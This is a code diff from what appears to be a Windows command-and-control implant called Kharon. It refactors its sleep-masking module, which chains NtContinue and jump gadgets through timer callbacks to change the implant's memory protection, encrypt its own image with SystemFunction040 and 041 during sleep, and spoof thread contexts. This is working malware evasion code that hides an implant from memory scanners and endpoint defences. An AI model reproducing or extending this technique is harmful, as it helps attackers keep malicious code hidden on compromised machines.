@@ -2,7 +2,7 @@
 
 using namespace Root;
 
-auto DECLFN Obfuscate::Main(
+auto DECLFN Mask::Main(
     _In_ ULONG Time
 ) -> BOOL {
 
@@ -14,17 +14,17 @@ auto DECLFN Obfuscate::Main(
 
     KhDbg( "sleep during: %d", RndTime );
 
-    switch( Kh->Mask.TechniqueID ) {
+    switch( Kh->Mk->Ctx.TechniqueID ) {
     case MaskTimer:
-        return Obfuscate::Timer( RndTime );
+        return Kh->Mk->Timer( RndTime );
     case MaskApc:
-        return Obfuscate::Apc( RndTime );
+        return Kh->Mk->Apc( RndTime );
     case MaskWait:
-        return Obfuscate::Wait( RndTime );
+        return Kh->Mk->Wait( RndTime );
     }
 }
 
-auto DECLFN Obfuscate::FindGadget(
+auto DECLFN Mask::FindGadget(
     _In_ UPTR   ModuleBase,
     _In_ UINT16 RegValue
 ) -> UPTR {
@@ -45,7 +45,7 @@ auto DECLFN Obfuscate::FindGadget(
     return Gadget;
 }
 
-auto DECLFN Obfuscate::Timer(
+auto DECLFN Mask::Timer(
     _In_ ULONG Time
 ) -> BOOL {
     NTSTATUS NtStatus = 0;
@@ -75,8 +75,8 @@ auto DECLFN Obfuscate::Timer(
 
     KhDbg( "kharon base at %p [0x%X bytes]\n", Kh->Session.Base.Start, Kh->Session.Base.Length );
     KhDbg( "running at thread id: %d thread id to duplicate: %d\n", Kh->Session.ThreadID, DupThreadId );
-    KhDbg( "NtContinue gadget at %p\n", Kh->Mask.NtContinueGadget );
-    KhDbg( "gadget at %p\n", Kh->Mask.JmpGadget );
+    KhDbg( "NtContinue gadget at %p\n", Kh->Mk->Ctx.NtContinueGadget );
+    KhDbg( "gadget at %p\n", Kh->Mk->Ctx.JmpGadget );
 
     DupThreadHandle = Kh->Td->Open( THREAD_ALL_ACCESS, FALSE, DupThreadId );
 
@@ -107,26 +107,26 @@ auto DECLFN Obfuscate::Timer(
         Ctx[i].Rsp -= sizeof( PVOID );
     }
 
-    Ctx[ic].Rip = U_PTR( Kh->Mask.JmpGadget );
+    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
     Ctx[ic].Rbx = U_PTR( Kh->Ntdll.NtWaitForSingleObject );
     Ctx[ic].Rcx = U_PTR( EventStart );
     Ctx[ic].Rdx = FALSE;
     Ctx[ic].R9  = NULL;
     ic++;
 
-    Ctx[ic].Rip = U_PTR( Kh->Mask.JmpGadget );
+    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
     Ctx[ic].Rbx = U_PTR( Kh->Ntdll.NtGetContextThread );
     Ctx[ic].Rcx = U_PTR( MainThreadHandle );
     Ctx[ic].Rdx = U_PTR( &CtxBkp );
     ic++;
 
-    Ctx[ic].Rip = U_PTR( Kh->Mask.JmpGadget ) ;
+    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget ) ;
     Ctx[ic].Rbx = U_PTR( Kh->Ntdll.NtSetContextThread ); 
     Ctx[ic].Rcx = U_PTR( MainThreadHandle );
     Ctx[ic].Rdx = U_PTR( &CtxSpf );
     ic++;
 
-    Ctx[ic].Rip = U_PTR( Kh->Mask.JmpGadget );
+    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
     Ctx[ic].Rbx = U_PTR( Kh->Krnl32.VirtualProtect );
     Ctx[ic].Rcx = U_PTR( Kh->Session.Base.Start );
     Ctx[ic].Rdx = Kh->Session.Base.Length;
@@ -134,26 +134,26 @@ auto DECLFN Obfuscate::Timer(
     Ctx[ic].R9  = U_PTR( &OldProtection );
     ic++;
 
-    Ctx[ic].Rip = U_PTR( Kh->Mask.JmpGadget );
+    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
     Ctx[ic].Rbx = U_PTR( Kh->Cryptbase.SystemFunction040 );
     Ctx[ic].Rcx = U_PTR( Kh->Session.Base.Start );
     Ctx[ic].Rdx = Kh->Session.Base.Length;
     ic++;
     
-    Ctx[ic].Rip = U_PTR( Kh->Mask.JmpGadget );
+    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
     Ctx[ic].Rbx = U_PTR( Kh->Krnl32.WaitForSingleObjectEx );
     Ctx[ic].Rcx = U_PTR( NtCurrentProcess() );
     Ctx[ic].Rdx = Time;
     Ctx[ic].R8  = FALSE;
     ic++;
         
-    Ctx[ic].Rip = U_PTR( Kh->Mask.JmpGadget );
+    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
     Ctx[ic].Rbx = U_PTR( Kh->Cryptbase.SystemFunction041 );
     Ctx[ic].Rcx = U_PTR( Kh->Session.Base.Start );
     Ctx[ic].Rdx = Kh->Session.Base.Length;
     ic++;
 
-    Ctx[ic].Rip = U_PTR( Kh->Mask.JmpGadget );
+    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
     Ctx[ic].Rbx = U_PTR( Kh->Krnl32.VirtualProtect );
     Ctx[ic].Rcx = U_PTR( Kh->Session.Base.Start );
     Ctx[ic].Rdx = Kh->Session.Base.Length;
@@ -161,13 +161,13 @@ auto DECLFN Obfuscate::Timer(
     Ctx[ic].R9  = U_PTR( &OldProtection );
     ic++;
 
-    Ctx[ic].Rip = U_PTR( Kh->Mask.JmpGadget );
+    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
     Ctx[ic].Rbx = U_PTR( Kh->Ntdll.NtSetContextThread );
     Ctx[ic].Rcx = U_PTR( MainThreadHandle );
     Ctx[ic].Rdx = U_PTR( &CtxBkp );
     ic++;
 
-    Ctx[ic].Rip = U_PTR( Kh->Mask.JmpGadget );
+    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
     Ctx[ic].Rbx = U_PTR( Kh->Ntdll.NtSetEvent );
     Ctx[ic].Rcx = U_PTR( EventEnd );
     ic++;
@@ -177,7 +177,7 @@ auto DECLFN Obfuscate::Timer(
     // }    
 
     for ( INT i = 0; i < ic; i++ ) {
-        Kh->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Kh->Mask.NtContinueGadget, &Ctx[i], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
+        Kh->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Kh->Mk->Ctx.NtContinueGadget, &Ctx[i], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
     }
 
     KhDbg( "trigger obf chain\n\n" );
@@ -196,13 +196,13 @@ _KH_END:
     return TRUE;
 }
 
-auto DECLFN Obfuscate::Apc(
+auto DECLFN Mask::Apc(
     _In_ ULONG Time
 ) -> BOOL {
 
 }
 
-auto DECLFN Obfuscate::Wait(
+auto DECLFN Mask::Wait(
     _In_ ULONG Time
 ) -> BOOL {
     return Kh->Krnl32.WaitForSingleObject( NtCurrentProcess(), Time );
